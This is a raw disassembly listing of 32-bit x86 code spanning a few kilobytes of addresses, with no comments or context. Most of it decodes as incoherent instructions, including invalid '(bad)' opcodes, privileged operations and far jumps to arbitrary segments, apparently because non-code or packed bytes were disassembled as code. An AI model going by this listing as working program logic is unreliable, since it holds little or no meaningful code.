  409181:	or     al,BYTE PTR [esi+eiz*1]
  409184:	stos   DWORD PTR es:[edi],eax
  409185:	pop    ss
  409186:	test   eax,0x402821a6
  40918b:	icebp  
  40918c:	les    edx,FWORD PTR [edi+ebp*2+0x55]
  409190:	jnp    0x4091e6
  409192:	in     al,0x6f
  409194:	out    dx,al
  409195:	and    al,0xdf
  409197:	test   eax,0xc2c249e9
  40919c:	ds jnp 0x40912e
  40919f:	and    edi,DWORD PTR [ebp+0x4c]
  4091a2:	nop
  4091a3:	inc    esp
  4091a4:	add    cl,BYTE PTR [ecx-0x5a]
  4091a7:	push   ebx
  4091a8:	cs bswap esi
  4091ab:	sbb    al,0xa8
  4091ad:	mov    edx,0xbf35fedb
  4091b2:	and    bh,al
  4091b4:	lea    ebp,[eax-0x3]
  4091b7:	repz shl edx,1
  4091ba:	test   eax,0x5fd9a195
  4091bf:	sysexit 
  4091c1:	dec    ebp
  4091c2:	lds    edx,FWORD PTR [eax]
  4091c4:	pop    ss
  4091c5:	out    dx,al
  4091c6:	adc    cl,ch
  4091c8:	jge    0x409161
  4091ca:	and    BYTE PTR ds:0xf2e3fc23,0xd9
  4091d1:	push   edi
  4091d2:	jp     0x40916b
  4091d4:	and    ch,BYTE PTR [edx+0xb]
  4091d7:	packsswb mm1,QWORD PTR [esi-0x28]
  4091db:	xor    eax,0x12567767
  4091e0:	lea    ebx,[edi-0x5e]
  4091e3:	div    BYTE PTR [ebx]
  4091e5:	mov    bh,0x5d
  4091e7:	inc    edx
  4091e8:	sti    
  4091e9:	dec    edi
  4091ea:	sub    DWORD PTR [ebp-0x1556e5e5],ecx
  4091f0:	jno    0x4091ae
  4091f2:	pop    ebx
  4091f3:	outs   dx,DWORD PTR ds:[esi]
  4091f4:	cdq    
  4091f5:	xchg   DWORD PTR fs:[ebx],ecx
  4091f8:	in     al,0x47
  4091fa:	and    al,0xf6
  4091fc:	loopne 0x40920f
  4091fe:	cdq    
  4091ff:	cmp    ecx,DWORD PTR ds:[edi+eiz*2]
  409203:	mov    ds:0x28e4e728,eax
  409208:	sub    eax,0xe642a143
  40920d:	jno    0x40927c
  40920f:	or     eax,0x74f14dd1
  409214:	loope  0x409274
  409216:	add    eax,0xdded9c7
  40921b:	fist   WORD PTR [ecx+0xfe201c9]
  409221:	pop    ecx
  409222:	ret    
  409223:	cwde   
  409224:	mov    esp,0xda1a7c0d
  409229:	mov    ebp,0x17dd1310
  40922e:	inc    edx
  40922f:	add    eax,0x70bc4469
  409234:	out    dx,al
  409235:	mov    esp,0x7c82cb2d
  40923a:	jg     0x409214
  40923c:	xchg   ebp,eax
  40923d:	jmp    0x77e9:0xeac4cf7b
  409244:	xchg   dl,cl
  409246:	lods   al,BYTE PTR ds:[esi]
  409247:	nop
  409248:	rcr    BYTE PTR [edi-0x25],0x51
  40924c:	data16 js 0x40929b
  40924f:	jg     0x409279
  409251:	xchg   ebp,eax
  409252:	lea    ebx,[ebp-0x3a44f415]
  409258:	mov    ebx,0x5c238124
  40925d:	ss mov dh,0x61
  409260:	rcl    BYTE PTR [edi+edi*8+0x76],1
  409264:	adc    eax,esp
  409266:	dec    ebp
  409267:	sub    al,0xb
  409269:	ror    BYTE PTR [ebp-0x6],1
  40926c:	(bad)  
  40926d:	sbb    edi,DWORD PTR [edx-0x3ed2bd5c]
  409273:	xchg   edi,eax
  409274:	jge    0x409224
  409276:	mov    edi,0x8bab5863
  40927b:	sbb    BYTE PTR [edi],dh
  40927d:	(bad)  
  40927e:	jae    0x40925a
  409280:	sbb    edx,edi
  409282:	hlt    
  409283:	cmp    bh,BYTE PTR [eax+0x13]
  409286:	scas   eax,DWORD PTR es:[edi]
  409287:	daa    
  409288:	sub    eax,0x350e9c25
  40928d:	ror    ebx,1
  40928f:	jle    0x4092bd
  409291:	adc    bl,BYTE PTR [edi+0x44591391]
  409297:	test   ebp,ebx
  409299:	loop   0x409278
  40929b:	mov    bh,0x3a
  40929d:	pop    edi
  40929e:	call   0xd269:0xbe141dd9
  4092a5:	iret   
  4092a6:	mov    edx,0x7c9422fb
  4092ab:	ror    BYTE PTR [edx+0x130a66ee],1
  4092b1:	mov    WORD PTR ds:0x32b52017,gs
  4092b7:	xchg   edi,eax
  4092b8:	inc    ebp
  4092b9:	xchg   edi,eax
  4092ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092bb:	add    DWORD PTR [edx],ebp
  4092bd:	(bad)  
  4092be:	adc    dl,BYTE PTR [edx+edx*4]
  4092c1:	xlat   BYTE PTR ds:[ebx]
  4092c2:	fwait
  4092c3:	push   edi
  4092c4:	inc    edx
  4092c5:	and    esp,DWORD PTR [ecx]
  4092c7:	push   ebx
  4092c8:	pop    eax
  4092c9:	mov    edi,0xe5fe9c9f
  4092ce:	mov    ds:0x2ee075d,al
  4092d3:	shl    BYTE PTR [esi-0x74],cl
  4092d6:	mov    bh,0x3b
  4092d8:	or     ah,BYTE PTR [edx+0x237fc287]
  4092de:	dec    esi
  4092df:	ss and esi,ebx
  4092e2:	in     al,dx
  4092e3:	adc    eax,0x647c8deb
  4092e8:	das    
  4092e9:	lds    ecx,FWORD PTR [edi]
  4092eb:	pop    ss
  4092ec:	push   eax
  4092ed:	or     ch,ah
  4092ef:	out    dx,al
  4092f0:	jae    0x409363
  4092f2:	aas    
  4092f3:	lods   al,BYTE PTR ds:[esi]
  4092f4:	ret    
  4092f5:	mov    edi,0xc4992008
  4092fa:	cli    
  4092fb:	and    al,0x55
  4092fd:	adc    ah,BYTE PTR [ecx-0x37]
  409300:	jg     0x409301
  409302:	xor    BYTE PTR [ebp+0x41b26005],cl
  409308:	add    bh,bh
  40930a:	xor    BYTE PTR [ebp+0x41b34405],cl
  409310:	add    bh,bh
  409312:	xor    BYTE PTR [edi-0x7cbcbc2d],al
  409318:	jmp    0x40931d
  40931a:	push   ebx
  40931b:	pop    eax
  40931c:	jmp    0x409669
  409321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409322:	jnp    0x409329
  409324:	or     DWORD PTR [ecx+0x52b3b211],esp
  40932a:	lahf   
  40932b:	jo     0x4092ae
  40932d:	push   edi
  40932e:	xor    ebp,eax
  409330:	ss daa 
  409332:	loop   0x4093a4
  409334:	jo     0x409356
  409336:	jge    0x4093a8
  409338:	jo     0x409367
  40933a:	jmp    0x8d5b2751
  40933f:	cmp    dh,BYTE PTR [ecx]
  409341:	xchg   ebp,eax
  409342:	mov    BYTE PTR gs:[eax+0xc],dl
  409346:	xor    edi,ecx
  409348:	inc    ebx
  409349:	mov    esi,0x2a713197
  40934e:	mov    edi,0x8a47b78c
  409353:	in     al,0x81
  409355:	pop    eax
  409356:	sbb    bh,bl
  409358:	mov    ds:0x23af7b36,eax
  40935d:	jne    0x409305
  40935f:	inc    edx
  409360:	mov    ecx,0x6221a7d
  409365:	push   esp
  409366:	cwde   
  409367:	sbb    eax,0xfac54fd3
  40936c:	pop    ecx
  40936d:	pushw  ss
  40936f:	xor    al,0xd9
  409371:	or     DWORD PTR [esi+esi*8+0x17],ebp
  409375:	cli    
  409376:	pop    edi
  409377:	aaa    
  409378:	cmp    al,0xa1
  40937a:	jmp    0xf9c4:0xe1c62628
  409381:	pushf  
  409382:	das    
  409383:	and    DWORD PTR [ebx-0x6f],ebp
  409386:	lds    ecx,FWORD PTR [ebx]
  409388:	sar    BYTE PTR [ebx],0xab
  40938b:	int    0x51
  40938d:	ret    
  40938e:	retf   
  40938f:	push   esi
  409390:	mov    ds:0x268b1c8d,al
  409395:	std    
  409396:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409398:	lock jp 0x4093da
  40939b:	mov    ch,BYTE PTR [esi+eax*8]
  40939e:	xchg   DWORD PTR cs:[esi+eax*1-0x1f1dbd54],edx
  4093a6:	(bad)  
  4093a7:	int3   
  4093a8:	xchg   esp,eax
  4093a9:	xchg   BYTE PTR [ecx+0xd3d0c6],cl
  4093af:	pop    ebx
  4093b0:	fidivr WORD PTR [edi-0x3a]
  4093b3:	aas    
  4093b4:	aaa    
  4093b5:	add    eax,0x403d8eb1
  4093ba:	mov    ds:0x48a05941,al
  4093bf:	outs   dx,BYTE PTR ds:[esi]
  4093c0:	jb     0x40936c
  4093c2:	mov    ebx,0xe6059050
  4093c7:	mov    BYTE PTR [edi],bl
  4093c9:	inc    edi
  4093ca:	pop    eax
  4093cb:	fisub  DWORD PTR [ebp+eax*1-0x29]
  4093cf:	mov    esi,0xc1f0fcfa
  4093d4:	sub    eax,esi
  4093d6:	mov    ebx,0x7a080876
  4093db:	adc    ecx,DWORD PTR [ebp+0x67]
  4093de:	push   ebx
  4093df:	push   ss
  4093e0:	cmp    ch,BYTE PTR [esi-0x5b]
  4093e3:	jecxz  0x409442
  4093e5:	loopne 0x40938a
  4093e7:	mov    edi,0xc58672be
  4093ec:	sar    BYTE PTR [edi-0x7bf74e74],0x69
  4093f3:	mov    eax,ds:0x4975e82e
  4093f8:	es aad 0xbe
  4093fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093fc:	mov    al,ds:0x5da0b26d
  409401:	dec    esi
  409402:	inc    ebp
  409403:	aas    
  409404:	pop    esi
  409405:	(bad)  
  409406:	mov    esi,0x7791fb68
  40940b:	and    DWORD PTR ds:0xcd670e5f,ebp
  409411:	mov    bl,0x25
  409413:	or     DWORD PTR [ebp+0x43062915],esp
  409419:	fimul  DWORD PTR [ecx+ebx*4-0x396ae132]
  409420:	int3   
  409421:	gs dec eax
  409423:	push   ebx
  409424:	fstp   DWORD PTR [edx-0x37]
  409427:	test   BYTE PTR [eax],0x85
  40942a:	pop    esp
  40942b:	add    BYTE PTR [eax],cl
  40942d:	jo     0x4093de
  40942f:	repnz rcl DWORD PTR [edx],cl
  409432:	loopne 0x40949b
  409434:	hlt    
  409435:	or     DWORD PTR [ecx-0x54],edi
  409438:	in     eax,0xe
  40943a:	inc    ebx
  40943b:	jbe    0x4093c9
  40943d:	inc    ebx
  40943e:	leave  
  40943f:	xchg   edi,eax
  409440:	test   BYTE PTR [eax],dl
  409442:	into   
  409443:	sub    dh,bl
  409445:	ins    BYTE PTR es:[edi],dx
  409446:	cmp    al,0x61
  409448:	sahf   
  409449:	dec    ecx
  40944a:	lods   al,BYTE PTR ds:[esi]
  40944b:	adc    DWORD PTR fs:[edx+ecx*2-0x1aeb0b34],edi
  409453:	lea    edx,[ebx]
  409455:	mul    DWORD PTR [edi-0x1096e826]
  40945b:	sahf   
  40945c:	popa   
  40945d:	rcr    BYTE PTR [esi],1
  40945f:	cmp    DWORD PTR [eax+0x3461f807],ebx
  409465:	lea    esp,[ecx]
  409467:	lods   al,BYTE PTR ds:[esi]
  409468:	jno    0x409448
  40946a:	iret   
  40946b:	mov    al,ds:0x57f757ce
  409470:	and    eax,0x7f692cb4
  409475:	mov    esp,0x2e38d033
  40947a:	sbb    BYTE PTR [edi],al
  40947c:	push   ebx
  40947d:	push   edx
  40947e:	ret    
  40947f:	shr    DWORD PTR [edx+0x35748f11],cl
  409485:	push   0x98b4e368
  40948a:	cwde   
  40948b:	cdq    
  40948c:	cli    
  40948d:	scas   eax,DWORD PTR es:[edi]
  40948e:	scas   al,BYTE PTR es:[edi]
  40948f:	mov    DWORD PTR [esi+0x6bc9aba9],0x3f2efa62
  409499:	pop    ebp
  40949a:	outs   dx,DWORD PTR ds:[esi]
  40949b:	add    edx,DWORD PTR [ecx]
  40949d:	pop    esp
  40949e:	mov    BYTE PTR [edx-0x351f8bf4],al
  4094a4:	aas    
  4094a5:	addr16 ret 0xfb74
  4094a9:	xor    DWORD PTR [ecx],esi
  4094ab:	out    0x34,eax
  4094ad:	inc    ebx
  4094ae:	div    dh
  4094b0:	loop   0x409434
  4094b2:	rcl    ch,0x15
  4094b5:	inc    edx
  4094b6:	jae    0x409457
  4094b8:	scas   ax,WORD PTR es:[edi]
  4094ba:	jle    0x40946e
  4094bc:	aas    
  4094bd:	xchg   ebp,eax
  4094be:	cmp    DWORD PTR [edx-0x73],esi
  4094c1:	xor    eax,0x2bd01c41
  4094c6:	aad    0x27
  4094c8:	retf   0xa0e4
  4094cb:	int3   
  4094cc:	into   
  4094cd:	lods   al,BYTE PTR ds:[esi]
  4094ce:	loop   0x40950e
  4094d0:	enter  0x8eab,0xa8
  4094d4:	fnstcw WORD PTR [ebx]
  4094d6:	cdq    
  4094d7:	jl     0x409487
  4094d9:	(bad)  
  4094da:	mov    eax,0x8d0fc80b
  4094df:	adc    eax,0x7e8ac677
  4094e4:	cdq    
  4094e5:	pop    ebx
  4094e6:	(bad)  
  4094e8:	sbb    dl,BYTE PTR [ebx]
  4094ea:	pop    ebx
  4094eb:	bound  eax,QWORD PTR [ebp-0x77f52f8c]
  4094f1:	jmp    0xe9b8cc27
  4094f6:	xor    DWORD PTR [ebx+0x48],esi
  4094f9:	xor    BYTE PTR [esi-0x69],dl
  4094fc:	xor    ah,BYTE PTR [ebx]
  4094fe:	and    eax,0x8af53670
  409503:	mov    BYTE PTR [eax+0x7aa91543],al
  409509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40950a:	cmp    DWORD PTR [ecx-0x767696c1],eax
  409510:	sbb    ebx,DWORD PTR [ebp+0x4fcfc436]
  409516:	test   al,0xfa
  409518:	xchg   ebp,eax
  409519:	int    0x49
  40951b:	aam    0x8a
  40951d:	cmp    ecx,DWORD PTR [esi-0x55806c73]
  409523:	sbb    al,BYTE PTR [edi-0x1b]
  409526:	cmp    al,0xaa
  409528:	(bad)  
  409529:	(bad)  
  40952a:	mov    ebx,0x9cd3b972
  40952f:	mov    ecx,0xf6b9d7db
  409534:	rcl    dh,1
  409536:	int    0xc4
  409538:	cmp    DWORD PTR [edi],esp
  40953a:	mov    al,ds:0xd2389c47
  40953f:	xor    eax,0xad9e4b55
  409544:	lds    eax,FWORD PTR [ecx-0xc]
  409547:	ficom  DWORD PTR [esi-0x180d15e4]
  40954d:	outs   dx,BYTE PTR ds:[esi]
  40954e:	push   eax
  40954f:	aad    0xd8
  409551:	jecxz  0x40958a
  409553:	(bad)  
  409555:	rol    BYTE PTR [eax],cl
  409557:	adc    bh,BYTE PTR [eax+0x6cfb1382]
  40955d:	dec    edx
  40955e:	xchg   ebx,eax
  40955f:	mov    esp,0xf6fdd6dd
  409564:	outs   dx,DWORD PTR ds:[esi]
  409565:	ret    
  409566:	bound  edx,QWORD PTR [ebp-0x6d52ef4d]
  40956c:	(bad)  
  40956e:	xchg   ch,bl
  409570:	pop    es
  409571:	imul   ebp,DWORD PTR [ebx-0x21],0x8b1e84c2
  409578:	test   BYTE PTR [ecx],dl
  40957a:	int    0xf6
  40957c:	stc    
  40957d:	(bad)  
  40957e:	push   eax
  40957f:	add    ebp,DWORD PTR [edx+0x221ce81c]
  409585:	or     ebx,DWORD PTR [ebx+0x58542b07]
  40958b:	dec    ebp
  40958c:	call   0x3a93816d
  409591:	out    dx,eax
  409592:	jno    0x40953b
  409594:	pop    eax
  409595:	xchg   esp,eax
  409596:	aad    0xd1
  409598:	ror    BYTE PTR [ecx+0x4cbce350],cl
  40959e:	mov    esp,0x56975e73
  4095a3:	xor    BYTE PTR [ecx-0x11],bh
  4095a6:	lods   al,BYTE PTR ds:[esi]
  4095a7:	ja     0x4095c7
  4095a9:	cld    
  4095aa:	aam    0xbb
  4095ac:	xchg   ecx,eax
  4095ad:	pushf  
  4095ae:	ror    BYTE PTR [eax+ecx*8-0x1dc95aa1],0xf8
  4095b6:	or     BYTE PTR [eax+0x5f],cl
  4095b9:	jne    0x40957d
  4095bb:	clc    
  4095bc:	std    
  4095bd:	and    eax,0x221458a8
  4095c2:	pop    ds
  4095c3:	stc    
  4095c4:	mov    dl,0xe
  4095c6:	push   cs
  4095c7:	mov    esp,0xc080dbf1
  4095cc:	mov    esp,0xcd215d5
  4095d1:	mov    ebx,0x925eb775
  4095d6:	call   0xf4af8057
  4095db:	fimul  WORD PTR [edx-0x5fddd4d1]
  4095e1:	xchg   esi,eax
  4095e2:	pusha  
  4095e3:	hlt    
  4095e4:	and    BYTE PTR [edi+0x1a],ah
  4095e7:	nop
  4095e8:	mov    bl,0x74
  4095ea:	pop    eax
  4095eb:	cmp    al,dl
  4095ed:	ja     0x4095d5
  4095ef:	dec    esi
  4095f0:	sub    eax,0xf30f9d5c
  4095f5:	shr    DWORD PTR [ecx+eiz*1+0xb],cl
  4095f9:	(bad)  
  4095fb:	push   cs
  4095fc:	and    DWORD PTR [edx+edx*1-0x9],edx
  409600:	mov    eax,ds:0x780783a2
  409605:	jge    0x40962d
  409607:	ret    0xac38
  40960a:	cwde   
  40960b:	and    eax,0xebb56fcf
  409610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409611:	sbb    edx,DWORD PTR gs:[eax-0x10dec565]
  409618:	cwde   
  409619:	mov    ds:0x22d0ada9,al
  40961e:	xchg   esp,eax
  40961f:	fcmovb st,st(5)
  409621:	les    esi,FWORD PTR [edx+ebp*4]
  409624:	out    dx,eax
  409625:	cs mov ebx,0x40876dab
  40962b:	push   ds
  40962c:	lahf   
  40962d:	dec    ebp
  40962e:	popa   
  40962f:	push   0x6b72e5a6
  409634:	and    eax,0x668756dc
  409639:	sub    DWORD PTR [ebx-0x16afe693],esi
  40963f:	add    bl,BYTE PTR [edi-0x36]
  409642:	sbb    DWORD PTR [edi-0x22f85988],0xfffffff5
  409649:	and    eax,0xbb3f866
  40964e:	pop    ecx
  40964f:	sbb    DWORD PTR [ecx+0x418eb1ce],0x1f
  409656:	pop    ebx
  409657:	sub    DWORD PTR [edi-0x732ed962],ebx
  40965d:	jae    0x40962e
  40965f:	popa   
  409660:	addr16 stc 
  409662:	adc    bh,dl
  409664:	sbb    ebx,DWORD PTR [eax]
  409666:	ret    0x851f
  409669:	call   DWORD PTR [eax+0x1]
  40966c:	mov    eax,DWORD PTR [ebp-0x20]
  40966f:	mov    ecx,DWORD PTR ds:0x41b224
  409675:	jmp    0x4099c2
  40967a:	out    dx,eax
  40967b:	mov    ebx,0xd169d149
  409680:	ja     0x4096e3
  409682:	add    BYTE PTR [edi+0x44],bh
  409685:	xchg   ecx,edi
  409687:	sub    edx,DWORD PTR [edi+0x70efd7fd]
  40968d:	jo     0x4096af
  40968f:	jge    0x409701
  409691:	jo     0x40967c
  409693:	dec    edx
  409694:	xlat   BYTE PTR ds:[ebx]
  409695:	pushf  
  409696:	in     al,0x1e
  409698:	(bad)  
  409699:	sub    esp,DWORD PTR [edi-0x6e8645b9]
  40969f:	adc    DWORD PTR [edx+0x95ebd62],ecx
  4096a5:	mov    cl,0xc9
  4096a7:	cs mov dl,0xf4
  4096aa:	out    dx,al
  4096ab:	jmp    0xa980:0x9b3547ba
  4096b2:	cld    
  4096b3:	pushf  
  4096b4:	adc    al,0xdc
  4096b6:	icebp  
  4096b7:	call   0x6f6f:0x606b616
  4096be:	push   ebx
  4096bf:	dec    ebp
  4096c0:	dec    esi
  4096c1:	lea    ecx,[eax-0x43]
  4096c4:	or     BYTE PTR [ebx],bl
  4096c6:	or     al,0xf7
  4096c8:	xor    al,0xc3
  4096ca:	fiadd  DWORD PTR [eax-0x450a9328]
  4096d0:	jmp    0x40969e
  4096d2:	shl    BYTE PTR [ebx+0x65],cl
  4096d5:	(bad)  
  4096d6:	lahf   
  4096d7:	adc    DWORD PTR [eax],0x324b2b7b
  4096dd:	sub    DWORD PTR [edx-0x6],esi
  4096e0:	mov    WORD PTR [ecx+0x1fea40ad],?
  4096e6:	leave  
  4096e7:	pop    ecx
  4096e8:	shl    BYTE PTR [edi-0x63],1
  4096eb:	neg    DWORD PTR [edx]
  4096ed:	and    BYTE PTR [edi-0x9],bh
  4096f0:	pushf  
  4096f1:	jbe    0x4096dc
  4096f3:	mov    al,0x5b
  4096f5:	xor    al,0xa7
  4096f7:	gs mov dl,0xe2
  4096fa:	xchg   edi,eax
  4096fb:	daa    
  4096fc:	shr    BYTE PTR [esi-0x59c5744f],1
  409702:	sbb    ah,BYTE PTR [esi+0x71]
  409705:	aaa    
  409706:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409707:	shl    DWORD PTR [esi],0x99
  40970a:	int3   
  40970b:	enter  0x7a41,0x27
  40970f:	jb     0x40972d
  409711:	loope  0x4096b7
  409713:	mov    bl,0xe5
  409715:	xchg   edi,eax
  409716:	jno    0x40978b
  409718:	jmp    0x5d9d30d6
  40971d:	mov    eax,0xa27f594e
  409722:	repnz inc ecx
  409724:	xchg   edi,eax
  409725:	fld    DWORD PTR [ebx+ecx*1-0x6f026b06]
  40972c:	jo     0x409755
  40972e:	mov    DWORD PTR [ecx+0x68],ebp
  409731:	push   es
  409732:	sbb    cl,bl
  409734:	mov    al,ds:0x2fafa820
  409739:	es aad 0xa8
  40973c:	jp     0x4096d0
  40973e:	sahf   
  40973f:	add    al,BYTE PTR [edi-0x29455ba4]
  409745:	call   0xae50:0x3c5bb40
  40974c:	or     al,0xcd
  40974e:	and    edi,DWORD PTR [ebp+0x46aca34c]
  409754:	adc    bh,BYTE PTR [esp+ebp*1+0x21]
  409758:	pop    esi
  409759:	pop    esp
  40975a:	(bad)  
  40975c:	fnstcw WORD PTR [eax]
  40975e:	jle    0x409777
  409760:	ss sub eax,0xf089ed20
  409766:	fcmovnb st,st(2)
  409768:	dec    ecx
  409769:	stos   DWORD PTR es:[edi],eax
  40976a:	add    edi,DWORD PTR [edx]
  40976c:	pop    ds
  40976d:	fld    QWORD PTR [ebp+esi*8+0x7b]
  409771:	push   ebp
  409772:	(bad)  
  409773:	clc    
  409774:	jae    0x409764
  409776:	iret   
  409777:	sub    BYTE PTR [esi],bh
  409779:	sbb    eax,0xdab1baf8
  40977e:	leave  
  40977f:	fld    TBYTE PTR [ebp-0x51]
  409782:	jae    0x409803
  409784:	mov    ebp,0x7bede289
  409789:	jp     0x409774
  40978b:	idiv   BYTE PTR [eax-0x63]
  40978e:	out    0xec,al
  409790:	inc    esp
  409791:	inc    ebp
  409792:	arpl   WORD PTR [edx+eax*1-0x67],ax
  409796:	(bad)  
  409797:	stos   BYTE PTR es:[edi],al
  409798:	mov    ebx,0xb493cd92
  40979d:	and    DWORD PTR [esi-0x43],0xd24551db
  4097a4:	push   cs
  4097a5:	test   BYTE PTR [ebp+0x7f386fd6],cl
  4097ab:	(bad)  
  4097ad:	adc    DWORD PTR [ecx-0x7],esp
  4097b0:	push   0xe75edbe5
  4097b5:	iret   
  4097b6:	fbstp  TBYTE PTR ds:0xb76e0e86
  4097bc:	into   
  4097bd:	jecxz  0x40983c
  4097bf:	inc    edi
  4097c0:	dec    BYTE PTR [esi]
  4097c2:	rol    ebx,0xc6
  4097c5:	xor    BYTE PTR ds:0xc2896434,bh
  4097cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097cc:	sbb    edi,DWORD PTR [edx]
  4097ce:	adc    BYTE PTR [ebp-0x65],dh
  4097d1:	fadd   DWORD PTR [edi-0x51968d1b]
  4097d7:	dec    edx
  4097d8:	out    dx,eax
  4097d9:	inc    ecx
  4097db:	inc    ebp
  4097dc:	out    0x7a,eax
  4097de:	pusha  
  4097df:	xor    eax,0x602c1931
  4097e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097e5:	push   ds
  4097e6:	sbb    edx,edi
  4097e8:	or     al,0xa5
  4097ea:	xor    al,0xd8
  4097ec:	pop    ss
  4097ed:	jns    0x409785
  4097ef:	mov    ecx,0xdbe87edc
  4097f4:	loope  0x409844
  4097f6:	pop    es
  4097f7:	mov    esi,0xfb052bc7
  4097fc:	call   0x251937f7
  409801:	cwde   
  409802:	popf   
  409803:	cmp    edx,DWORD PTR [esi]
  409805:	(bad)  
  409806:	arpl   sp,cx
  409808:	test   esp,esp
  40980a:	dec    eax
  40980b:	int    0x68
  40980d:	and    eax,DWORD PTR [ebp+0x7b673a84]
  409813:	sbb    BYTE PTR [eax-0x25615bb5],ah
  409819:	pop    edi
  40981a:	jmp    0x409890
  40981c:	cdq    
  40981d:	mov    ebp,DWORD PTR [edi-0x33]
  409820:	jmp    0xf2f89cae
  409825:	or     edi,DWORD PTR [esi+edx*4-0x76]
  409829:	jmp    0x4097ad
  40982b:	jg     0x409887
  40982d:	xor    eax,edx
  40982f:	push   eax
  409830:	call   0xd0d3257f
  409835:	das    
  409836:	mov    ah,0xe4
  409838:	dec    esp
  409839:	out    dx,eax
  40983a:	sub    BYTE PTR [eax+edi*8],0xf6
  40983e:	cwde   
  40983f:	and    eax,0xa84cf11a
  409844:	jns    0x4097e7
  409846:	lods   eax,DWORD PTR ds:[esi]
  409847:	dec    ebx
  409848:	push   esp
  409849:	mov    edx,edi
  40984b:	mov    edi,0x7d47e425
  409850:	xchg   ebx,eax
  409851:	push   0x16ee5ae
  409856:	clts   
  409858:	xchg   DWORD PTR [edx],ebp
  40985a:	int3   
  40985b:	cwde   
  40985c:	imul   ebp,DWORD PTR [edx-0x20],0x16
  409860:	inc    ebx
  409861:	jbe    0x409808
  409863:	cs and al,0x14
  409866:	xchg   DWORD PTR [edi-0x23],edi
  409869:	cmp    al,0x89
  40986b:	add    al,0xb4
  40986d:	jb     0x409868
  40986f:	mov    dl,0xe3
  409871:	dec    ebp
  409872:	int3   
  409873:	stos   DWORD PTR es:[edi],eax
  409874:	jns    0x4098e3
  409876:	lock xor DWORD PTR [edx+esi*1],edx
  40987a:	dec    esp
  40987b:	xchg   edx,eax
  40987c:	pushf  
  40987d:	jmp    0x23dba1e
  409882:	adc    al,0xbe
  409884:	or     eax,0x9c978ab6
  409889:	cmc    
  40988a:	dec    ebx
  40988b:	inc    ebp
  40988c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40988e:	mov    ecx,0x8ef57c9c
  409893:	ins    DWORD PTR es:[edi],dx
  409894:	xor    DWORD PTR [edi],edx
  409896:	adc    al,0x78
  409898:	mov    edi,0xd1631828
  40989d:	arpl   WORD PTR [ebx-0x1e6d564f],cx
  4098a3:	dec    ecx
  4098a4:	dec    ecx
  4098a5:	xchg   ebp,eax
  4098a6:	fdiv   st(0),st
  4098a8:	push   esp
  4098a9:	enter  0x6caf,0x9b
  4098ad:	push   0xffffffb4
  4098af:	fsubr  DWORD PTR [edi+0x3243c334]
  4098b5:	imul   edx,DWORD PTR [edi-0x31],0xc0eb39b
  4098bc:	enter  0x2f5b,0x93
  4098c0:	or     al,BYTE PTR [eax+0x3f]
  4098c3:	(bad)  
  4098c4:	int    0x96
  4098c6:	push   es
  4098c7:	popa   
  4098c8:	les    ebp,FWORD PTR [ebp-0x80]
  4098cb:	mov    al,0x6b
  4098cd:	xlat   BYTE PTR ds:[ebx]
  4098ce:	sar    DWORD PTR [eax],1
  4098d0:	popf   
  4098d1:	stos   BYTE PTR es:[edi],al
  4098d2:	cmp    al,0xd8
  4098d4:	out    0x0,al
  4098d6:	add    ch,BYTE PTR [eax-0x8c988ee]
  4098dc:	pop    edi
  4098dd:	jo     0x40991d
  4098df:	sub    DWORD PTR [esi-0x31],0x866118f8
  4098e6:	shl    BYTE PTR [edx+0x7b],cl
  4098e9:	aad    0xc4
  4098eb:	fiadd  WORD PTR [edx]
  4098ed:	bound  ebp,QWORD PTR [edi+ebp*8+0x78aa81d2]
  4098f4:	sbb    ebp,DWORD PTR [ebp+0x2e]
  4098f7:	push   edi
  4098f8:	pop    ss
  4098f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098fa:	inc    esi
  4098fb:	(bad)  
  4098fd:	icebp  
  4098fe:	adc    ebp,DWORD PTR [eax+ecx*1]
  409901:	xchg   ebx,eax
  409902:	xchg   ebp,eax
  409903:	push   eax
  409904:	aad    0x83
  409906:	ret    0x3920
  409909:	jbe    0x40995e
  40990b:	popf   
  40990c:	in     eax,0xc3
  40990e:	xchg   edi,eax
  40990f:	test   al,0xd9
  409911:	aaa    
  409912:	mov    edi,0x765a5236
  409917:	mov    eax,ds:0xbfe037ea
  40991c:	xchg   esi,eax
  40991d:	mov    ds:0x2617817b,eax
  409922:	and    BYTE PTR [esi+0x4f347af7],dh
  409928:	mov    al,0x1a
  40992a:	fdivr  DWORD PTR [ecx+0x2b]
  40992d:	adc    DWORD PTR [esi+0x5d],0xf45b302d
  409934:	mov    esi,0xc518f225
  409939:	or     eax,0x26ed249a
  40993e:	cmp    al,0xa0
  409940:	stc    
  409941:	mov    al,ds:0x1dc7afda
  409946:	icebp  
  409947:	or     ebp,ebx
  409949:	sub    BYTE PTR ds:0x454eda46,0x76
  409950:	push   ebp
  409951:	xchg   edi,eax
  409952:	adc    eax,0x3bab74e6
  409957:	dec    edi
  409958:	icebp  
  409959:	inc    esi
  40995a:	stos   DWORD PTR es:[edi],eax
  40995b:	xchg   edx,eax
  40995c:	shl    DWORD PTR [ecx],0x17
  40995f:	jg     0x409907
  409961:	sti    
  409962:	(bad)  
  409963:	push   esp
  409964:	mov    esp,0xae569379
  409969:	mov    ebx,0x7b91b327
  40996e:	(bad)  
  40996f:	fild   DWORD PTR [edx]
  409971:	mov    edx,0xc76fa1f5
  409976:	mov    al,ds:0xcfb53b90
  40997b:	xor    edi,DWORD PTR [edx+edi*4+0x65]
  40997f:	or     BYTE PTR [edx+ebx*8],ah
  409982:	add    DWORD PTR [ebp+edx*4+0x72a55f32],edi
  409989:	and    bh,ah
  40998b:	fnsave [edi+0x19]
  40998e:	inc    esp
  40998f:	test   al,0xf6
  409991:	xchg   ecx,eax
  409992:	popa   
  409993:	out    dx,eax
  409994:	push   0xffffffff
  409996:	int    0x2d
  409998:	call   0x80d7:0x4af561b5
  40999f:	mov    edx,0x2e7f5f24
  4099a4:	es jns 0x40998e
  4099a7:	sub    dh,ah
